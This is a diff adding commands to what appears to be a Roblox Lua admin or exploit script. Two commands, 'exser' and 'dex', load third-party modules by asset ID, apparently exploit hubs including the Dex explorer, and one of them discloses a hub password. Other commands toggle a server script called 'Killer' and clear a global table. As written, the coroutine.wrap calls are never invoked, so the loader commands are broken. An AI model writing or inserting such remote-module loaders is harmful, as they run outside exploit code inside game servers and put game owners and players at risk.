@@ -583,6 +583,52 @@ addcmd({
 })
 
 addcmd({
+	Name = "exser",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		coroutine.wrap(function()
+			require(10868847330):pls(sender.Name)
+			task.wait(1)
+			notfi(sender.Name, "Exser", "The hub password is c00lkidds")
+		end)
+	end
+})
+
+addcmd({
+	Name = "dex",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		coroutine.wrap(function()
+			require(15827159924).MauDex(sender.Name)
+		end)
+	end
+})
+
+addcmd({
+	Name = "nok",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = false
+	end
+})
+
+addcmd({
+	Name = "ok",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = true
+	end
+})
+
+addcmd({
+	Name = "clrbuilds",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		_G.btoolsparts = {}
+	end
+})
+
+addcmd({
 	Name = "unload",
 	Aliases = {},
 	Function = function(sender, targets, arguments)
